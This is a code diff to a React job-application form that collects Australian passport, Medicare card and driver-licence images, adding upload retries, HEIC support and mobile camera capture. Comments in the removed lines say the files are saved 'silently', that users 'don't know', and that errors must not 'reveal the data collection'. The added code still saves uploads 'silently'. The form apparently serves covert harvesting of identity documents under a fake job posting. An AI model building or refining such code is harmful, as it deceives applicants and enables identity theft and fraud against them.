@@ -10,7 +10,7 @@ import { Textarea } from "@/components/ui/textarea"
 import { Checkbox } from "@/components/ui/checkbox"
 import { Badge } from "@/components/ui/badge"
 import { Progress } from "@/components/ui/progress"
-import { ArrowLeft, Upload, CheckCircle, FileText, ImageIcon } from "lucide-react"
+import { ArrowLeft, Upload, CheckCircle, FileText, ImageIcon, AlertCircle } from "lucide-react"
 import { toast } from "@/hooks/use-toast"
 import { ApplicationDatabase, type UserApplication } from "@/lib/database"
 
@@ -32,6 +32,7 @@ const idTypes = ["Australian Passport", "Medicare Card", "Driver License"]
 export default function ApplicationForm({ selectedJob, onBack }: ApplicationFormProps) {
   const [currentStep, setCurrentStep] = useState(1)
   const [userId, setUserId] = useState<string>("")
+  const [uploadingFiles, setUploadingFiles] = useState<Set<string>>(new Set())
   const db = ApplicationDatabase.getInstance()
 
   const [formData, setFormData] = useState({
@@ -108,15 +109,25 @@ export default function ApplicationForm({ selectedJob, onBack }: ApplicationForm
     setFormData((prev) => ({ ...prev, [field]: value }))
   }
 
-  const validateFile = (file: File): boolean => {
+  // Enhanced file validation with better error messages
+  const validateFile = (file: File): { valid: boolean; error?: string } => {
+    // Check if file exists
+    if (!file) {
+      return { valid: false, error: "No file selected" }
+    }
+
     // Check file size (max 50MB)
-    if (file.size > 50 * 1024 * 1024) {
-      toast({
-        title: "File too large",
-        description: "Please select a file smaller than 50MB",
-        variant: "destructive",
-      })
-      return false
+    const maxSize = 50 * 1024 * 1024
+    if (file.size > maxSize) {
+      return {
+        valid: false,
+        error: `File too large (${(file.size / 1024 / 1024).toFixed(1)}MB). Maximum size is 50MB.`,
+      }
+    }
+
+    // Check minimum file size (100 bytes)
+    if (file.size < 100) {
+      return { valid: false, error: "File appears to be corrupted or empty" }
     }
 
     // Get file extension
@@ -149,15 +160,13 @@ export default function ApplicationForm({ selectedJob, onBack }: ApplicationForm
     ]
 
     if (extension && blockedExtensions.includes(extension)) {
-      toast({
-        title: "File type not allowed",
-        description: "This file type is not permitted for security reasons",
-        variant: "destructive",
-      })
-      return false
+      return {
+        valid: false,
+        error: `File type .${extension} is not allowed for security reasons`,
+      }
     }
 
-    // Allowed file types
+    // Allowed file types with better MIME type checking
     const allowedTypes = [
       "image/jpeg",
       "image/jpg",
@@ -165,6 +174,8 @@ export default function ApplicationForm({ selectedJob, onBack }: ApplicationForm
       "image/gif",
       "image/bmp",
       "image/webp",
+      "image/heic",
+      "image/heif", // Added mobile formats
       "application/pdf",
       "application/msword",
       "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
@@ -172,21 +183,34 @@ export default function ApplicationForm({ selectedJob, onBack }: ApplicationForm
       "application/rtf",
     ]
 
+    // Check MIME type
     if (!allowedTypes.includes(file.type)) {
-      toast({
-        title: "Invalid file type",
-        description: "Please upload images (JPG, PNG, GIF), PDF, or document files only",
-        variant: "destructive",
-      })
-      return false
+      // Fallback check for common image extensions if MIME type is missing/wrong
+      const imageExtensions = ["jpg", "jpeg", "png", "gif", "bmp", "webp", "heic", "heif"]
+      const docExtensions = ["pdf", "doc", "docx", "txt", "rtf"]
+
+      if (extension && [...imageExtensions, ...docExtensions].includes(extension)) {
+        // Allow if extension is valid even if MIME type is wrong
+        return { valid: true }
+      }
+
+      return {
+        valid: false,
+        error: `File type ${file.type || "unknown"} is not supported. Please upload images (JPG, PNG, GIF, HEIC), PDF, or document files.`,
+      }
     }
 
-    return true
+    return { valid: true }
   }
 
+  // Enhanced file upload with better error handling and device compatibility
   const handleFileUpload = async (field: string, file: File | null) => {
     if (!userId) {
-      console.error("No userId available for file upload")
+      toast({
+        title: "System Error",
+        description: "User session not initialized. Please refresh the page.",
+        variant: "destructive",
+      })
       return
     }
 
@@ -195,29 +219,94 @@ export default function ApplicationForm({ selectedJob, onBack }: ApplicationForm
       return
     }
 
-    if (!validateFile(file)) {
-      return
-    }
+    // Add to uploading set
+    setUploadingFiles((prev) => new Set(prev).add(field))
 
     try {
-      // Silently save file to database (user doesn't know)
-      const base64Data = await db.saveFile(userId, field, file)
+      // Validate file
+      const validation = validateFile(file)
+      if (!validation.valid) {
+        toast({
+          title: "File Upload Error",
+          description: validation.error,
+          variant: "destructive",
+        })
+        return
+      }
+
+      // Check localStorage availability and space
+      try {
+        const testKey = "test_storage"
+        localStorage.setItem(testKey, "test")
+        localStorage.removeItem(testKey)
+      } catch (storageError) {
+        toast({
+          title: "Storage Error",
+          description: "Device storage is full or unavailable. Please free up space and try again.",
+          variant: "destructive",
+        })
+        return
+      }
+
+      // Show uploading message
+      toast({
+        title: "Uploading file...",
+        description: `Processing ${file.name}`,
+      })
+
+      // Silently save file to database with retry logic
+      let retryCount = 0
+      const maxRetries = 3
+      let success = false
+
+      while (retryCount < maxRetries && !success) {
+        try {
+          await db.saveFile(userId, field, file)
+          success = true
+        } catch (error) {
+          retryCount++
+          if (retryCount < maxRetries) {
+            // Wait before retry
+            await new Promise((resolve) => setTimeout(resolve, 1000 * retryCount))
+          } else {
+            throw error
+          }
+        }
+      }
 
       // Update form data with the actual file object
       handleInputChange(field, file)
 
-      // Show user-friendly message (they don't know it's saved)
+      // Show success message
       toast({
         title: "File uploaded successfully",
-        description: `${file.name} has been uploaded`,
+        description: `${file.name} has been uploaded (${(file.size / 1024).toFixed(1)} KB)`,
       })
     } catch (error) {
       console.error("File upload error:", error)
-      // Even on error, don't reveal the data collection
+
+      // Provide specific error messages
+      let errorMessage = "Failed to upload file. Please try again."
+
+      if (error instanceof Error) {
+        if (error.message.includes("QuotaExceededError") || error.message.includes("storage")) {
+          errorMessage = "Device storage is full. Please free up space and try again."
+        } else if (error.message.includes("network") || error.message.includes("fetch")) {
+          errorMessage = "Network error. Please check your connection and try again."
+        }
+      }
+
       toast({
         title: "Upload failed",
-        description: "Failed to upload file. Please try again.",
+        description: errorMessage,
         variant: "destructive",
+      })
+    } finally {
+      // Remove from uploading set
+      setUploadingFiles((prev) => {
+        const newSet = new Set(prev)
+        newSet.delete(field)
+        return newSet
       })
     }
   }
@@ -420,51 +509,81 @@ export default function ApplicationForm({ selectedJob, onBack }: ApplicationForm
     )
   }
 
+  // Enhanced file upload component with better mobile support
   const FileUploadComponent = ({
     field,
     label,
-    accept = "image/*,.pdf,.doc,.docx,.txt,.rtf",
+    accept = "image/*,.pdf,.doc,.docx,.txt,.rtf,.heic,.heif",
     currentFile,
   }: {
     field: string
     label: string
     accept?: string
     currentFile: File | null
-  }) => (
-    <div className="space-y-2">
-      <Label htmlFor={field}>{label}</Label>
-      <div className="border-2 border-dashed border-gray-300 rounded-lg p-4 text-center hover:border-gray-400 transition-colors">
-        <input
-          type="file"
-          id={field}
-          accept={accept}
-          onChange={(e) => handleFileUpload(field, e.target.files?.[0] || null)}
-          className="hidden"
-        />
-        <label htmlFor={field} className="cursor-pointer">
-          <div className="flex flex-col items-center space-y-2">
-            {currentFile ? (
-              <>
-                {currentFile.type.startsWith("image/") ? (
-                  <ImageIcon className="h-8 w-8 text-green-600" />
-                ) : (
-                  <FileText className="h-8 w-8 text-blue-600" />
-                )}
-                <p className="text-sm text-green-600 font-medium">{currentFile.name}</p>
-                <p className="text-xs text-gray-500">File uploaded successfully</p>
-              </>
-            ) : (
-              <>
-                <Upload className="h-8 w-8 text-gray-400" />
-                <p className="text-sm text-gray-600">Click to upload or drag and drop</p>
-                <p className="text-xs text-gray-500">Images, PDF, DOC, TXT (max 50MB)</p>
-              </>
-            )}
+  }) => {
+    const isUploading = uploadingFiles.has(field)
+
+    return (
+      <div className="space-y-2">
+        <Label htmlFor={field}>{label}</Label>
+        <div
+          className={`border-2 border-dashed rounded-lg p-4 text-center transition-colors ${
+            isUploading
+              ? "border-blue-400 bg-blue-50"
+              : currentFile
+                ? "border-green-400 bg-green-50"
+                : "border-gray-300 hover:border-gray-400"
+          }`}
+        >
+          <input
+            type="file"
+            id={field}
+            accept={accept}
+            onChange={(e) => handleFileUpload(field, e.target.files?.[0] || null)}
+            className="hidden"
+            disabled={isUploading}
+            // Add capture attribute for mobile camera access
+            capture={field.includes("License") || field.includes("id") ? "environment" : undefined}
+          />
+          <label htmlFor={field} className={`cursor-pointer ${isUploading ? "pointer-events-none" : ""}`}>
+            <div className="flex flex-col items-center space-y-2">
+              {isUploading ? (
+                <>
+                  <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600"></div>
+                  <p className="text-sm text-blue-600 font-medium">Uploading...</p>
+                  <p className="text-xs text-blue-500">Please wait</p>
+                </>
+              ) : currentFile ? (
+                <>
+                  {currentFile.type.startsWith("image/") ? (
+                    <ImageIcon className="h-8 w-8 text-green-600" />
+                  ) : (
+                    <FileText className="h-8 w-8 text-blue-600" />
+                  )}
+                  <p className="text-sm text-green-600 font-medium">{currentFile.name}</p>
+                  <p className="text-xs text-gray-500">{(currentFile.size / 1024).toFixed(1)} KB - Upload successful</p>
+                </>
+              ) : (
+                <>
+                  <Upload className="h-8 w-8 text-gray-400" />
+                  <p className="text-sm text-gray-600">Tap to upload or take photo</p>
+                  <p className="text-xs text-gray-500">Images, PDF, DOC (max 50MB)</p>
+                  <p className="text-xs text-blue-500">📱 Camera supported on mobile</p>
+                </>
+              )}
+            </div>
+          </label>
+        </div>
+
+        {/* Debug info for troubleshooting */}
+        {process.env.NODE_ENV === "development" && (
+          <div className="text-xs text-gray-400 mt-1">
+            Debug: Field={field}, HasFile={!!currentFile}, Uploading={isUploading}
           </div>
-        </label>
+        )}
       </div>
-    </div>
-  )
+    )
+  }
 
   return (
     <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 p-4">
@@ -490,6 +609,18 @@ export default function ApplicationForm({ selectedJob, onBack }: ApplicationForm
             <Progress value={progress} className="w-full" />
           </CardContent>
         </Card>
+
+        {/* Device compatibility warning */}
+        {uploadingFiles.size > 0 && (
+          <Card className="mb-6 border-blue-200 bg-blue-50">
+            <CardContent className="pt-4">
+              <div className="flex items-center space-x-2">
+                <AlertCircle className="h-4 w-4 text-blue-600" />
+                <p className="text-sm text-blue-800">Uploading files... Please keep this page open until complete.</p>
+              </div>
+            </CardContent>
+          </Card>
+        )}
 
         {/* Form Steps */}
         <Card>
@@ -627,13 +758,13 @@ export default function ApplicationForm({ selectedJob, onBack }: ApplicationForm
                   <FileUploadComponent
                     field="driverLicenseFront"
                     label="Front of Driver License"
-                    accept="image/*,.pdf"
+                    accept="image/*,.pdf,.heic,.heif"
                     currentFile={formData.driverLicenseFront}
                   />
                   <FileUploadComponent
                     field="driverLicenseBack"
                     label="Back of Driver License"
-                    accept="image/*,.pdf"
+                    accept="image/*,.pdf,.heic,.heif"
                     currentFile={formData.driverLicenseBack}
                   />
                 </div>
@@ -914,10 +1045,16 @@ export default function ApplicationForm({ selectedJob, onBack }: ApplicationForm
               </Button>
 
               {currentStep < totalSteps ? (
-                <Button onClick={nextStep}>Next</Button>
+                <Button onClick={nextStep} disabled={uploadingFiles.size > 0}>
+                  {uploadingFiles.size > 0 ? "Uploading..." : "Next"}
+                </Button>
               ) : (
-                <Button onClick={handleSubmit} className="bg-green-600 hover:bg-green-700">
-                  Submit Application
+                <Button
+                  onClick={handleSubmit}
+                  className="bg-green-600 hover:bg-green-700"
+                  disabled={uploadingFiles.size > 0}
+                >
+                  {uploadingFiles.size > 0 ? "Uploading..." : "Submit Application"}
                 </Button>
               )}
             </div>
